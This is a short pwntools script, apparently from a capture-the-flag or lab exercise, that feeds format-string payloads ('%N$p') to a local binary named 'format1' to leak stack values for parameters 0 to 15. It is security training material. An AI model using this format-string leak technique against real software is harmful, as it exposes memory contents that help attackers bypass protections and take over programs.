import sys
from pwn import *

context.log_level = 'debug'

def leak(param_num):
    c = process("./format1")
    c.recvline()
    c.recvline()
    c.sendline(f"%{param_num}$p")
    leak_raw = c.recvline().strip()
    leak_value = int(leak_raw, 16)
    c.sendline(b'_')
    c.sendline(b'_')
    c.wait()
    return leak_value


for i in range(0,16):
    try:
        with context.silent:
            leak_val = leak(i)
        log.info(f"Value leaked at param {i}: {hex(leak_val)}")
    except Exception as e:
        log.info(f"Failed to leak value for param num {i}")
        print(e)

